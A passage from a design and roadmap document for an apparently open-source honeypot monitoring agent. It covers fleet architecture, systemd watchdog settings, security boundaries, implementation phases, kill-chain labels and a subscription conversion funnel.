├── agent/                    # Core agent (Go)
│   ├── eye/                  # Monitoring subsystems
│   ├── hand/                 # Command execution
│   ├── labeler/              # Local kill-chain classification
│   ├── inference/            # XGBoost inference engine (pure Go)
│   ├── features/             # Feature accumulator (must match training pipeline)
│   ├── transport/            # local SQLite, NATS, MeshCentral, DFI relay
│   ├── dashboard/            # Local web UI
│   ├── plugin/               # Plugin framework
│   └── export/               # Dataset export (XGBoost CSV format)
├── central/                  # Self-hosted Central (open-source)
├── training/                 # XGBoost training pipeline (Python)
├── schemas/                  # ClickHouse + SQLite schemas
├── models/                   # Starter XGBoost models
├── personas/                 # Persona template library
├── plugins/                  # Community plugin collection
├── docs/                     # Documentation site
└── datasets/                 # Sample datasets + format specs
    ├── xgb_v1_spec.md        # XGBoost dataset format (public)
    └── cnn_v1_dataformat.md  # CNN data format only (public, no model code)
```

---

## 10K Scale Architecture

### Regional Topology

```
                    ┌─────────────────────────────┐
                    │       DFI Central Cluster     │
                    │  Decision engines (pool)      │
                    │  Redis (fleet state)           │
                    │  ClickHouse Central (labels,   │
                    │    intelligence, aggregated)   │
                    └──────────────┬──────────────┘
                                   │
              ┌────────────────────┼─────────────────────┐
              │                    │                      │
     ┌────────▼──────┐   ┌────────▼──────┐   ┌──────────▼────┐
     │  Region: US-E  │   │  Region: EU-W  │   │  Region: APAC │
     │  NATS relay    │   │  NATS relay    │   │  NATS relay    │
     │  MeshCentral   │   │  MeshCentral   │   │  MeshCentral   │
     │  Regional CH   │   │  Regional CH   │   │  Regional CH   │
     │                │   │                │   │                │
     │  PVE hosts     │   │  PVE hosts     │   │  PVE hosts     │
     │  └─ AIO VMs    │   │  └─ AIO VMs    │   │  └─ AIO VMs    │
     └────────────────┘   └────────────────┘   └────────────────┘
```

### Tiered Observation Forwarding

| Observation Type | Regional Processing | Forwarded to Central |
|---|---|---|
| Heartbeat | ✓ | Anomalies only |
| Scan/recon events | ✓ | Summaries only |
| Brute-force events | ✓ | After labeling |
| Auth success | ✓ | Always (high-value) |
| Post-auth commands | ✓ | Always (training data) |
| Breadcrumb consumed | Forward immediately | Always (cross-VM) |
| Tool download | Forward immediately | Always (threat intel) |
| C2 connection | Forward immediately | Always (C2 feed) |
| Novel behavior | Forward immediately | Always (human review) |

### Growth Phases

| Phase | Scale | Architecture |
|---|---|---|
| 1 | 1–50 VMs | Single host, MeshCentral for everything, Central = one process |
| 2 | 50–500 VMs | Multiple hosts, add NATS for eye, Central gets Redis + 2-3 workers |
| 3 | 500–2K VMs | Regional architecture (2-3 regions), regional CH, tiered forwarding |
| 4 | 2K–10K VMs | Full regional (10-20 regions), CH sharded at Central, decision engine pool |

**The agent binary doesn't change across phases.** Transport endpoint is a config change, not a code change.

### Resource Estimates at 10K

| Component | Count | Resources Per |
|---|---|---|
| AIO VMs | 10,000 | 1–4 GB RAM, 1–2 vCPU |
| Proxmox hosts | 200–500 | 128 GB RAM, 32 cores |
| Regional relays | 10–20 | 16 GB RAM, 8 cores |
| Central cluster | 3–5 nodes | 64 GB RAM, 32 cores |
| Central ingress | — | 10 Gbps |

---

## Agent Self-Management

### Watchdog

```ini
[Service]
Type=simple
ExecStart=/usr/local/sbin/dfi-agent
Restart=always
RestartSec=5
StartLimitBurst=5
StartLimitIntervalSec=60
WatchdogSec=30
CPUQuota=5%                     # hypervisor role: never compete with Hunter
MemoryMax=256M                  # hypervisor role: bounded resource usage
```

### Self-Update

Central pushes new binary via NATS or MeshCentral → agent validates SHA-256 → writes new binary → exec-replaces → new version sends version heartbeat → failure triggers watchdog fallback to old binary.

### Health Heartbeat (every 60s)

```json
{
  "msg_type": "heartbeat",
  "vm_id": "aio-wp-03",
  "agent_version": "0.4.2",
  "agent_cpu_pct": 1.2,
  "agent_mem_mb": 45,
  "eye_queue_depth": 0,
  "hand_queue_depth": 0,
  "xgb_model_version": "2026.02.15",
  "active_external_sessions": 1,
  "uptime_sec": 86400,
  "errors_last_hour": 0
}
```

---

## Security Boundaries

**Command validation:** Every command validated against schema. Unknown types rejected and logged.

**Typed commands preferred** over raw `exec` for auditability and reversibility.

**Rate limiting:** Max 10 commands/sec sustained, burst to 50.

**No inbound listeners:** Agent accepts commands only from local MeshCentral/NATS via IPC.

**Tag requirement:** Every command must include `tag` field. Untagged commands rejected.

**Contamination firewall:** Action log records every agent-executed command with timestamps. Evidence pipeline cross-references to distinguish agent activity from attacker activity.

**Resource caps on hypervisor:** `CPUQuota=5%`, `MemoryMax=256M` so agent never interferes with Hunter's packet processing.

**Model file security (premium):** CNN weights encrypted at rest, decrypted in memory only, subscription-keyed. Lapsed subscription = graceful fallback to XGBoost.

---

## Implementation Phases

### Phase 1 — Foundation

- [ ] Go daemon skeleton: systemd service, config loading, role detection
- [ ] Eye basics: auditd tail, login/logout tracking, command capture
- [ ] Hand basics: health_check, service_status, file_ops, exec
- [ ] Local SQLite store (Tier 0 standalone)
- [ ] Observation batching and priority escalation
- [ ] Action logging (contamination firewall)
- [ ] Health heartbeat

### Phase 2 — XGBoost Integration

- [ ] Feature accumulator (75 features, real-time, matches ClickHouse export)
- [ ] XGBoost inference engine (pure Go)
- [ ] Progressive classification pipeline
- [ ] Model performance self-monitoring
- [ ] Prediction → evidence feedback loop
- [ ] Local labeler (kill-chain classification from XGBoost + eye evidence)
- [ ] Local dashboard (web UI at :9740)
- [ ] Local alerting (email, webhook, syslog)

### Phase 3 — Fleet Communication

- [ ] NATS transport (eye observations)
- [ ] MeshCentral transport (hand commands)
- [ ] Central enrollment protocol
- [ ] Self-hosted Central (basic version)
- [ ] Fleet dashboard
- [ ] Cross-machine correlation at Central

### Phase 4 — Operational Admin

- [ ] Full diagnostic commands (diagnose, capture_state, log_bundle)
- [ ] System admin commands (service, package, config, user, cron, firewall)
- [ ] Self-update mechanism
- [ ] Rate limiting and timeout enforcement

### Phase 5 — Hypervisor Role

- [ ] Hunter monitoring and control
- [ ] ClickHouse monitoring and admin
- [ ] VM fleet monitoring
- [ ] VM lifecycle commands (snapshot, rollback, clone, migrate, destroy)
- [ ] Hardware health monitoring
- [ ] Model-driven capture depth (agent prediction → Hunter D0-D3)

### Phase 6 — Persona & Engagement

- [ ] File integrity baselining and diff reporting
- [ ] Persona file deployment with backdating
- [ ] Simulated admin login
- [ ] Breadcrumb planting and consumption tracking
- [ ] Credential staging
- [ ] Vulnerability deployment
- [ ] Dynamic service deployment
- [ ] Outbound connection control
- [ ] Central: persona graph, cross-VM consistency

### Phase 7 — Deep Evidence & Fingerprinting

- [ ] PTY stream capture
- [ ] Memory forensics
- [ ] Attacker tool download capture
- [ ] DNS query monitoring with process attribution
- [ ] Shell behavior profiling
- [ ] Honeypot detection tracking
- [ ] Tool identification via behavioral signatures

### Phase 8 — Open-Source Release

- [ ] Public GitHub repos (agent, central, training, schemas, docs)
- [ ] One-liner installer + Docker image
- [ ] Documentation site (quickstart, deployment, API reference, plugin dev, contributing)
- [ ] Starter XGBoost model bundled
- [ ] XGBoost training pipeline published
- [ ] CNN dataset format spec published (no model code)
- [ ] Persona template library (starter set)
- [ ] Plugin framework + example plugins
- [ ] Sample datasets for testing

### Phase 9 — DFI Network & Premium

- [ ] Community relay infrastructure
- [ ] Contribution protocol (anonymized observation sharing)
- [ ] Community blocklist generation
- [ ] Premium model delivery (encrypted CNN, production XGBoost)
- [ ] Premium trial mode (14-day CNN side-by-side comparison)
- [ ] Global frequency table updates
- [ ] Premium API endpoint
- [ ] Subscription management integration

### Phase 10 — Fleet Intelligence

- [ ] Lateral movement tracking across VMs
- [ ] Distributed canary token management
- [ ] Fleet-wide vulnerability rotation
- [ ] ATT&CK auto-tagging
- [ ] Time-to-exploitation tracking pipeline
- [ ] Engagement quality scoring
- [ ] Persona effectiveness metrics
- [ ] Threat intelligence feed generation (C2, CVE, TTP)

---

## Appendix A — Naming Convention

| Component | Production Name | Rationale |
|---|---|---|
| Daemon binary | `/usr/local/sbin/dfi-agent` | Standard sbin location |
| Systemd unit | `dfi-agent.service` | Named for the project in open-source |
| Config | `/etc/dfi-agent/config.yaml` | Standard config location |
| Action log | `/var/log/dfi-agent/actions.log` | Contamination audit trail |
| Models | `/var/lib/dfi-agent/models/` | Data directory |
| Local DB | `/var/lib/dfi-agent/observations.db` | Tier 0 standalone only |
| Plugins | `/etc/dfi-agent/plugins/` | User-installed plugins |

Note: On honeypot VMs where stealth matters, the binary can be symlinked or renamed to something innocuous like `sysmon-helper`. The open-source distribution uses the real name.

## Appendix B — Labels Mapping

| Observation Pattern | Label | Confidence Boost |
|---|---|---|
| External login, no further commands | RECON/KNOCK | +0.1 |
| ≥3 auth failures from same session | BRUTEFORCE | +0.2 |
| Auth success → suspicious command | EXPLOIT | +0.25 |
| Auth success → download → execute → outbound | COMPROMISE | +0.3 |
| Auth success → breadcrumb → lateral movement | COMPROMISE | +0.3 |

## Appendix C — Central State Machine Per VM

```
         ┌──────┐
         │ IDLE │ ◄── No external sessions
         └──┬───┘
            │ External login detected
            ▼
       ┌─────────┐
       │ WATCHING │ ◄── High-frequency reporting
       └──┬──┬───┘
          │  │ Engagement warranted
          │  ▼
          │ ┌──────────┐
          │ │ ENGAGING  │ ◄── Central sending commands
          │ └──┬───────┘
          │    │ Session ends
          ▼    ▼
       ┌─────────┐
       │ COOLDOWN │ ◄── Post-engagement analysis
       └──┬──────┘
          │ Complete
          ▼
       ┌──────┐
       │ IDLE │
       └──────┘

Special:
       ┌──────┐
       │ DARK │ ◄── Eye stopped, heartbeat alive
       └──────┘     (attacker killed monitoring = data)
```

## Appendix D — Conversion Funnel

```
100K installs (open-source, standalone XGBoost)
    │
    ├── User sees local model performance dashboard
    │   XGBoost: 97% RECON, 93% BRUTE, 84% EXPLOIT, 77% COMPROMISE
    │
    30K active nodes
    │
    ├── Connect to community network (free, Tier 2)
    │   Contribute observations, receive blocklist
    │
    10K community contributors
    │
    ├── Premium trial (14 days, Tier 3)
    │   CNN runs alongside XGBoost
    │   Dashboard: "CNN caught 23 incidents XGBoost missed"
    │
    2K premium subscribers
    │
    └── $6K–$200K/year per subscriber
        $50M+ ARR target
```
